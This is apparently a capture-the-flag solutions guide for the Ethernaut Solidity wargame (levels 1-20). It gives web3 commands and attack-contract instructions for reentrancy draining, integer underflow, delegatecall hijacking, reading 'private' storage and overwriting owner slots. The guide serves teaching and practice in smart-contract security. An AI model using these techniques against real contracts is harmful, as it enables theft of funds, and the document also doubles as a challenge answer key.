# Ethernaut - Solutions

## 1. Fallback

```
await contract.contribute({ value: toWei("0.0001") });
await contract.sendTransaction({ value: toWei("0.0001") });
await contract.withdraw();
```


## 2. Fallout

```
await contract.Fal1out({ value: toWei("0.0001") });
await contract.collectAllocations();
```


## 3. Coin Flip

Compile [CoinFlipAttack.sol](./solutions/CoinFlipAttack.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Do not forget to specify the level `instance` address when deploying the attacker contract (constructor).  
Afterwards, just call the `callFlipWithCorrectGuess()` function 10 times.


## 4. Telephone

Compile [TelephoneProxy.sol](./solutions/TelephoneProxy.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Afterwards, just call the `giveMeTelephoneOwnership(address _telephoneContract)` function with the level `instance` address as first argument.

## 5. Token

```
const balance = Number(await contract.balanceOf(player));
await contract.transfer(level /* can be any address except own */, balance + 1 /* create underflow in contract */);
```

## 6. Delegation

See solidity function [delegatecall](https://solidity-by-example.org/delegatecall/).
```
await contract.sendTransaction({ data: web3.eth.abi.encodeFunctionSignature("pwn()") });
```

## 7. Force

See solidity function [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/).  
Compile [ForcePay.sol](./solutions/ForcePay.sol) and deploy it to the Rinkeby testnet with at least 0.001 ETH.
Afterwards, just call the `destroyAndLeaveBalanceAt(address _contract)` function with the level `instance` address as first argument.

## 8. Vault

```
const password = await web3.eth.getStorageAt(instance, 1); // get storage variable at index 1 of contract (although it's private!)
await contract.unlock(password);
```

## 9. King

Compile [King4Ever.sol](./solutions/King4Ever.sol) and deploy it to the Rinkeby testnet with at least 0.001 ETH and the level `instance` address as argument (constructor).
The fallback function of this contract is going to revert any subsequent transaction which is trying to claim the throne.

## 10. Re-entrancy

Compile [ReentranceAttack.sol](./solutions/ReentranceAttack.sol) and deploy it to the Rinkeby testnet with e.g. 0.0001 ETH and the level `instance` address as argument (constructor).
Afterwards, just call the `drainVictim()` function to steal all funds from the level contract. Once this is done, do not forget to call the `withdraw()` function to get the funds back to your wallet.

## 11. Elevator

Compile [Building.sol](./solutions/Building.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Afterwards, just call the `goToTop(address _elevatorContract)` function with the level `instance` address as first argument.

## 12. Privacy

See [Layout of State Variables in Storage](https://docs.soliditylang.org/en/v0.6.12/internals/layout_in_storage.html).
```
const data2_32 = await web3.eth.getStorageAt(instance, 5); // get private storage variable 'data[2]' from contract
const data2_16 = data2_32.substring(0, data2_32.length - 32); // remove last 16 bytes from data[2], i.e. typecast from bytes32 to bytes16
await contract.unlock(data2_16);
```

## 13. Gatekeeper One

See [Solidity - Conversions](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).  
Compile [GatebreakerOne.sol](./solutions/GatebreakerOne.sol) and deploy it to the Rinkeby testnet with the level `instance` address as argument (constructor). Done!

## 14. Gatekeeper Two

See [Bypass Contract Size Check](https://solidity-by-example.org/hacks/contract-size/).  
Compile [GatebreakerTwo.sol](./solutions/GatebreakerTwo.sol) and deploy it to the Rinkeby testnet with the level `instance` address as argument (constructor). Done!


## 15. Naught Coin

Circumvent the token lock using (non-overrided) ERC20 base class functions:
```
const playerBalance = await contract.balanceOf(player);
await contract.approve(player, playerBalance); // approve self to transfer tokens using 'transferFrom' function

const tokenReceiver = web3.eth.accounts.create(); // create new account to receive tokens
await contract.transferFrom(player, tokenReceiver.address, playerBalance); // transfer tokens to new account
```

## 16. Preservation

See solidity function [delegatecall](https://solidity-by-example.org/delegatecall/).  
Compile [MadLibraryContract.sol](./solutions/MadLibraryContract.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Afterwards, just call the `attack1(address _preservationContract)` and `attack2(address _preservationContract)` functions with the level `instance` address as first argument.
Note that the attack needed to be split into two distinct transactions due to [cached storage reads](https://github.com/ethereum/solidity/issues/3118) in Solidity.


## 17. Recovery

Contract addresses in the EVM (Ethereum Virtual Machine) are deterministic, see [How is the Ethereum contract address calculated?](https://netfreeman.com/2022/02/202202032047017508.html).  
Furthermore, it is crucial to understand RLP (Recursive Length Prefix) coding, see [RLP | Ethereum Wiki](https://eth.wiki/fundamentals/rlp) and [Online RLP en-/decoder](https://toolkit.abdk.consulting/ethereum#rlp).  
Assuming call to function `generateToken(string memory _name, uint256 _initialSupply)` was the first transaction of the freshly deployed `Recovery` contract: `nonce = 1`.
```
/*
const tempHash = web3.utils.soliditySha3(RLP([ instance, nonce ])); // nonce = 1
 --> RLP(nonce) = RLP(1) = "0x01"
 --> RLP(instance) = 0x80 + bytelen(instance), instance = 0x80 + 20, instance = "0x94", instance
 -> ... := "0x94", instance, "0x01"
 -> RLP([ instance, nonce ]) = RLP("0x94", instance, "0x01") = 0xC0 + bytelen(...), ... = 0xC0 + 22, ... = "0xD6", ...
*/
const tempHash = web3.utils.soliditySha3("0xD6", "0x94", instance, "0x01");
const contractAddress = "0x" + tempHash.slice(26); // slice '0x' and first 12 bytes -> address of lost 'SimpleToken' contract


// Call 'destroy(address payable _to)' function of 'SimpleToken' contract to recover funds.
const destroySig = web3.eth.abi.encodeFunctionSignature("destroy(address)"); // 'address payable' is just 'address' in ABI
const destroyParam = web3.eth.abi.encodeParameter("address", player);
const destroyData = destroySig + destroyParam.slice(2); // slice '0x' before concatenating hex strings
await web3.eth.sendTransaction({ from: player, to: contractAddress, data: destroyData });
```

## 18. MagicNumber

See [How to deploy contracts using raw assembly opcodes](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2) for an in-depth walk-through.

Contract bytecode / opcodes (see [Ethereum Virtual Machine Opcodes](https://www.ethervm.io/)):
```
// --- INITIALIZATION / CONTACT CREATION CODE ---
// codecopy(t=0x00, f=0x0C, s=0x0A) ... copy runtime code to memory
60 0A   // push1 0x0A (size of runtime code)
60 0C   // push1 0x0C (offset of runtime code = size of init code)
60 00   // push1 0x00 (destination memory location)
39      // codecopy

// return(p=0x00, s=0x0A) ... return data at memory location 0x00 with size 0x0A bytes
                              [return runtime code to EVM]
60 0A   // push1 0x0A
60 00   // push1 0x00
F3      // return


// --- RUNTIME CODE ---
// mstore(p=0x00, v=0x2A) ... store byte 0x2A (42) at memory location 0x00
60 2A   // push1 0x2A
60 00   // push1 0x00
52      // mstore

// return(p=0x00, s=0x20) ... return data at memory location 0x00 with size 0x20 (32) bytes
                              [return uint256(42) to caller]
60 20   // push1 0x20
60 00   // push1 0x00
F3      // return
```

Web3 code:
```
const contractBytes = "0x600A600C600039600A6000F3602A60005260206000F3";
const solverContract = await web3.eth.sendTransaction({ from: player, data: contractBytes });
await contract.setSolver(solverContract.contractAddress);
```


## 19. Alien Codex

See [Collisions of Solidity Storage Layouts](https://mixbytes.io/blog/collisions-solidity-storage-layouts).
```
await contract.make_contact();
await contract.retract(); // use underflow to make all 2^256 storage slots accessible via 'codex' array

/* Storage slot layout:
    0: owner (address), contact (bool)
    1: codex.length (uint256)
    .
    .
    .
    keccak256(1): codex[0] (bytes32)
    .
    keccak256(1)+i: codex[i] (bytes32)
*/
const uint256_range = web3.utils.toBN(2).pow(web3.utils.toBN(256)); // 2^256
const codex_offset = web3.utils.toBN(web3.utils.soliditySha3(1)); // 1 is the storage slot of 'codex[]'
const storage0_relative_to_codex = uint256_range.sub(codex_offset); // compute index of storage slot 0 relative to 'codex[]'
const storage0_new_content = "0x000000000000000000000001" + player.slice(2); // build 32 bytes hex string with player address and 'contact = true'

await contract.revise(storage0_relative_to_codex, storage0_new_content); // replace contract owner with player
```

## 20. Denial

See [Difference between require and assert and the difference between revert and throw](https://ethereum.stackexchange.com/questions/15166/difference-between-require-and-assert-and-the-difference-between-revert-and-thro).  
Compile [Deny.sol](./solutions/Deny.sol) and deploy it to the Rinkeby testnet with the level `instance` address as argument (constructor). Done!

